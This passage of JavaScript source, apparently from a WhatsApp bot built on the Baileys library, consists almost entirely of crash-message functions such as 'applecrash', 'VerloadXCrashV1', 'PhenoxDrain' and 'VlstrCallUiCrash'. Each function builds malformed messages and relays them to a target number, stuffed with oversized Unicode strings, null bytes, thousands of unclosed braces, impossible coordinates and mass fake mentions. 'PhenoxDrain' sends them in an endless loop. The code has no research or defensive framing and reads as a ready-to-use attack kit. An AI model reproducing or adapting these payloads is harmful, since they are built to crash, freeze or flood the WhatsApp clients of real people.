    }]
  });
}

async function applecrash(target) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const abcd = [
    { attrs: { biz_bot: "1" }, tag: "bot" },
    { attrs: {}, tag: "biz" },
  ];

  const api = JSON.stringify({
    status: true,
    criador: "RenzMods",
    resultado: { type: "md", ws: { _eventsCount: 800000, mobile: true } },
  });

  const quotedMsg = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: "ABCDEF123456",
    },
    message: {
      conversation: "— renz 𖥻𝟽𝟹𝟷  قضيب",
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
  };

  const embeddedMusic1 = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "— Renz 𖥻𝟽𝟹𝟷  قضيب°" + "ោ៝".repeat(10000),
    title: "— Renz 𖥻𝟽𝟹𝟷  قضيب",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://t.me/RapzXyzz",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const embeddedMusic2 = {
    musicContentMediaId: "ziee",
    songId: "lemer",
    author: "—Renz  𖥻𝟽𝟹𝟷  قضيب",
    title: "— Renz  𖥻𝟽𝟹𝟷  قضيب",
    artworkDirectPath:
      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
  };

  const messages = [
    {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
          mimetype: "video/mp4",
          fileSha256: "l1hrH5Ol/Ko470AI8H1zlEuHxfnBbozFRZ7E80tD2L8=",
          fileLength: "27879524",
          seconds: 70,
          mediaKey: "2AcdMRLVnTLIIRZFArddskCLl3duuisx2YTHYvMoQPI=",
          caption: "— Renz 𖥻𝟽𝟹𝟷  قضيب" + abcd,
          height: 1280,
          width: 720,
          fileEncSha256: "GHX2S/UWYN5R44Tfrwg2Jc+cUSIyyhkqmNUjUwAlnSU=",
          directPath:
            "/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
          mediaKeyTimestamp: "1746354010",
          contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList,
            quotedMessage: quotedMsg.message,
            stanzaId: quotedMsg.key.id,
            participant: quotedMsg.key.remoteJid,
          },
          annotations: [
            {
              embeddedContent: { embeddedMusic: embeddedMusic1 },
              embeddedAction: true,
            },
          ],
        },
      },
    },
    {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            mentionedJid: mentionedList,
            quotedMessage: quotedMsg.message,
            stanzaId: quotedMsg.key.id,
            participant: quotedMsg.key.remoteJid,
          },
        },
      },
    },
    {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "— Renz 𖥻𝟽𝟹𝟷  قضيب",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath:
            "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList,
            quotedMessage: quotedMsg.message,
            stanzaId: quotedMsg.key.id,
            participant: quotedMsg.key.remoteJid,
          },
          annotations: [
            {
              embeddedContent: { embeddedMusic: embeddedMusic2 },
              embeddedAction: true,
            },
          ],
        },
      },
    },
  ];

  for (const msg of messages) {
    const generated = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: msg,
      },
      {}
    );
    await sock.relayMessage("status@broadcast", generated.message, {
      messageId: generated.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    if ((mention && msg === messages[0]) || (abcd && msg === messages[2])) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: generated.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined,
            },
          ],
        }
      );
    }
  }
}

async function newImage2(target) {
  sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "5gIyX+O/MW1melPouaIuIQQDPgTC9Q+DhAOqbW8zSDM=",
                fileLength: "26289",
                height: 640,
                width: 640,
                mediaKey: "o645YKUri8uGNJi8qkK6OQzUqN7XbmAcEeH3kmEfd6Q=",
                fileEncSha256: "tYWnWmEHh3M7CTqRRGeWeZLkfC2Co+BfPwX3veO7X2g=",
                directPath: "/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1754843222",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAQIDBAUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8hjWGmKdNprB8zuegQNAORmZ6HFNc8+jwWbAJM7cysQm/X5tZ10ZQ61JLnOUikgoljUhqSEAAAAAAFAJ/8QAIRAAAgICAgMAAwAAAAAAAAAAAQIAEQMQICESIjEyQVH/2gAIAQEAAT8A1erhyEH5A4PGu4ZjI8xcPgzM1dRiAxqBzF+bEdbgxPVwDIsb7pD1q55iKQTMuQDEAJjyU3YsQ4MZtqh/IgRbAnf9hY6uJmZYAh9upkykP00QWSTCZmKD1XiSdBv1pjfAauXFaGXu+A5Xw//EABgRAAMBAQAAAAAAAAAAAAAAAAERMAAQ/9oACAECAQE/AOEqRDyp/8QAGREBAAIDAAAAAAAAAAAAAAAAARARACAw/9oACAEDAQE/AIC9khgcvp//2Q==",
                caption: "TdXSlient" + "ꦽ".repeat(8000),
                scansSidecar: "RmfY5jow2amGTRfFdNpnhzQbXEYQynt5e96bDEHdZxyAg0/KdkNyKQ==",
                scanLengths: [3226, 8477, 3748, 10838],
                midQualityFileSha256: "tTbMuuzvy47bplW9qZcMumtle1pWO87jw2Qw2veSENs="
              },
              hasMediaAttachment: true
            },
            body: {
              text: " Renz-# " + "ꦽ".repeat(8000)
            },
            footerText: "© Another Kill You ?",
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                },
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                }
              ],
              messageParamsJson: ""
            },
            contextInfo: {
              remoteJid: "30748291653858@lid",
              participant: "0@s.whatsapp.net",
              mentionedJid: [ "0@s.whatsapp.net" ],
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/XameliaXD",
                    unconsentedUsersUrl: "https://t.me/XameliaXD",
                    consentedUsersUrl: "https://t.me/XameliaXD",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/XameliaXD",
                    unconsentedUsersUrl: "https://t.me/XameliaXD",
                    consentedUsersUrl: "https://t.me/XameliaXD",
                    cardIndex: 2,
                  }
                ]
              },
            quotedMessage: {
              paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      }
    },{ participant: { jid: target } });
  }

async function VerloadXCrashV1(target) {
  try {
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: ".👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });
    
    const messageBetaXx = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Renzze Is Here!៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Renzze Is Here៚".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `Renzze Is Here៚${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageBetaXx, {
      participant: { jid: target },
    });
    
    const message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟༑⌁⃰Renzze Is Here",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "🩸⃟༑⌁⃰Renzze Is Here".repeat(100000),
                address: "vxz.json".repeat(100000),
              },
            },
            body: {
              text: "🩸⃟༑⌁⃰Renzze Is Here",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };
    
    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ X.json }"
    }
  };
  
  const messageCardsX = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: ""
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: target,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ X.json }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, messageCardsX, { messageId: null });
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}




async function PhenoxForce(target) {
  try {
    const messageContent = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          ),
        },
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: JSON.stringify({
            values: {
              in_pin_code: "999999",
              building_name: "Renzz",
              landmark_area: "X",
              address: "Phenox-Is-Kill",
              tower_number: "kils",
              city: "papua",
              name: "Renzz",
              phone_number: "999999999999",
              house_number: "xxx",
              floor_number: "xxx",
              state: `D | ${"\u0000".repeat(90000)}`,
            },
          }),
          version: 3,
        },
      },
    };

    const msg = generateWAMessageFromContent(target, messageContent, {
      userJid: sock.user.id,
    });

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`✅ Pesan PhenoxScary Force berhasil dikirim ke ${target}`);
  } catch (err) {
    console.error(`❌ Terjadi kesalahan pada Zenzo Force:`, err);
  }
}

async function IosPayX(sock, target, ptcp = false) {
  try {
    const msg = {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 86400000,
        currencyCodeIso4217: "USD",
        amount: "999",
        requestFrom: target,
        noteMessage: {
          text: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
        }
      },
      contextInfo: {
        participant: ptcp ? target : "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "𑇂𑆵𑆴𑆿".repeat(25000)
        },
        forwardingScore: 1,
        isForwarded: false
      }
    };

    await sock.relayMessage(target, msg, {
      messageId: zaree.generateMessageTag(),
      participant: { jid: target },
      messageTimestamp: Date.now()
    });
  } catch (err) {}
}

async function PhenoxDrain(target) {
while (true) {
        const message = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://files.catbox.moe/fqwhgj.png",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "",
                        fileLength: { low: 200000000, high: 0, unsigned: true },
                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                        isAvatar: false,
                        isAiSticker: false,
                        isLottie: false,
                    },
                },
            },
        };

        const msg = generateWAMessageFromContent(target, message, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });
    }
}

async function IosX(target) {
await sock.relayMessage(target, {
  contactsArrayMessage: {
    displayName: "‼️⃟ ༚ Getsuzoᜆ" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "‼️⃟ ༚Companyᜆ",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ Hᜆ;;;\nFN:‼️⃟ ༚ Getsuzpᜆ\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "‼️⃟ ༚Getsuzoᜆ",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻�𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ Getsuzoᜆ\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}

async function VlstrCallUiCrash(target) {
  try {
    const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const ehemohok = "᬴".repeat(250000);
    const ngopi = "Aduhai bang bang";

    const norruimsg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [target],
                quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
              },
              body: { text: ngopi + "ꦾ".repeat(50000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(20000),
                buttons: [
                  { name: "single_select", buttonParamsJson: "" },
                  { name: "call_permission_request", buttonParamsJson: "" }
                ]
              }
            }
          }
        }
      },
      {}
    )

    const markhama = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [target],
                quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
              },
              body: { text: ngopi + "ꦾ".repeat(50000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(20000),
                buttons: [
                  { name: "single_select", buttonParamsJson: "" },
                  { name: "call_permission_request", buttonParamsJson: "" }
                ]
              }
            }
          }
        }
      },
      {}
    )

    await sock.relayMessage(target, markhama.message, { participant: { jid: target }, messageId: markhama.key.id })
    await sock.sendMessage(target, { text: ehemohok, contextInfo: { mentionedJid: spamMention } })
    await sock.relayMessage(target, norruimsg.message, { messageId: norruimsg.key.id, participant: { jid: target } })

    const apalah = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ngopi, format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              version: 3,
              paramsJson: JSON.stringify({
                trigger: true,
                action: "call_crash",
                note: ngopi,
                filler: "꧔".repeat(50000)
              })
            }
          }
        }
      },
      nativeFlowMessage: { name: "render_crash_component", messageParamsJson: "{".repeat(70000) },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "9999999999",
        seconds: 999999,
        ptt: true,
        streamingSidecar: "꧔꧈".repeat(9999)
      }
    }
    await sock.relayMessage(target, { message: apalah }, { messageId: norruimsg.key.id })

    const blankContent = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
            externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true },
            header: {
              title: ngopi,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000)
              }
            },
            body: { text: ngopi },
            interactiveResponseMessage: {
              body: { text: ngopi, format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                status: true,
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                paramsJson: `{
                  "screen_2_OptIn_0": true,
                  "screen_2_OptIn_1": true,
                  "screen_1_Dropdown_0": ngopi,
                  "screen_1_DatePicker_1": "1028995200000",
                  "screen_1_TextInput_2": "cyber@gmail.com",
                  "screen_1_TextInput_3": "94643116",
                  "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                  "screen_0_TextInput_1": "Why?",
                  "screen_0_Dropdown_2": "001-Grimgar",
                  "screen_0_RadioButtonsGroup_3": "0_true",
                  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }`,
                version: 3
              }
            }
          }
        }
      }
    }
    const blankahah = await generateWAMessageFromContent(target, blankContent, {})
    await sock.relayMessage(target, blankahah.message, { messageId: blankahah.key.id })
    console.log("bug terkirim");
  } catch (e) {
    console.error("error:", e)
  }
}

async function QueenSqL(target) {
  const randomHex = (len = 16) =>
    [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  let msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageAssociation: {
          associationType: 2,
          parentMessageKey: randomHex(16)
        },
        messageSecret: randomHex(32), 
        supportPayload: JSON.stringify({
          version: 2,
          is_ai_message: true,
          should_show_system_message: true,
          expiration: -9999,
          ephemeralSettingTimestamp: 9741,
          disappearingMode: {
            initiator: "INITIATED_BY_OTHER",
            trigger: "ACCOUNT_SETTING"
          }
        }),
        isForwarded: true,
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        quotedMessage: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              jpegThumbnail: fs.readFileSync('./Zu.jpg'),
              title: "Wilzu" + "снД".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_and_pay".repeat(5000),
                  buttonParamsJson: JSON.stringify({
                    currency: "XXX",
                    payment_configuration: "",
                    payment_type: "",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "4SWMDTS1PY4",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      description: "",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                          name: "wilzu is herr".repeat(5000),
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1
                        }
                      ]
                    },
                    additional_note: "Dwilzu",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }
      },
      header: {
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        }
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 1000000, offset: 100 },
              reference_id: "Dwilzu",
              type: "physical-goods",
              order: {
                status: "canceled",
                subtotal: { value: 0, offset: 100 },
                order_type: "PAYMENT_REQUEST",
                items: [
                  {
                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                    name: "wilzu is herr".repeat(5000),
                    amount: { value: 1000000, offset: 100 },
                    quantity: 1000
                  }
                ]
              },
              additional_note: "wilzu ",
              native_payment_methods: [],
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: "{}"
      },
      annotations: [
        {
          embeddedContent: {
            embeddedMessage: {
              message: "wilzu is here"
            }
          },
          location: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "wilzu is herr".repeat(5000)
          },
          polygonVertices: [
            { x: 60.71664810180664, y: -36.39784622192383 },
            { x: -16.710189819335938, y: 49.263675689697266 },
            { x: -56.585853576660156, y: 37.85963439941406 },
            { x: 20.840980529785156, y: -47.80188751220703 }
          ],
          newsletter: {
            newsletterJid: "1@newsletter",
            newsletterName: "wilzu is herr".repeat(5000),
            contentType: "UPDATE",
            accessibilityText: "Wilzu"
          }
        }
      ]
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function ios(target) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
    )
  ];

  const bug = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "GetSuzo Company࿐" + "󠀳󠀳󠀳󠀵󠀵󠀵󠀵‪󠀳󠀳󠀳󠀵󠀵󠀵󠀵󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(9000),
      previewType: "NONE",
      contextInfo: {
        mentionedJid: mentionedList,
        forwardingScore: 250208,
        isForwarded: true,
        isFromMe: true,
        externalAdReply: {
          title: "Lamer Kids",
          body: "Maklu Ampas",
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          previewType: "VIDEO",
          thumbnail: slash,
          sourceType: "X",
          sourceId: "X",
          sourceUrl: "https://t.me/DiegoD8rando",
          mediaUrl: "https://t.me/DiegoD8rando",
          containsAutoReply: true,
          showAdAttribution: true,
          ctwaClid: "ctwa_clid_example",
          ref: "ref_example"
        },
        quotedMessage: {
          contactMessage: {
            displayName: "company࿐",
            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:𝑫𝒊𝒆𝒈𝒐𝑫'𝑩𝒓𝒂𝒏𝒅𝒐࿐\nTEL;type=CELL:+5521992999999\nEND:VCARD"
          }
        },
        remoteJid: "status@broadcast"
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  }, {
    participant: { jid: target }
  });


  await sock.relayMessage(target, bug.message, {
    messageId: bug.key.id
  });
}


async function cccxccccxx(target) {
let msg = generateWAMessageFromContent(target, {
  interactiveMessage: {
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 1972,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    }, 
    header: {
      jpegThumbnail: "7eppImg", 
      hasMediaAttachment: true, 
      title: "D | 7eppeli-Exploration"
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "payment_method",
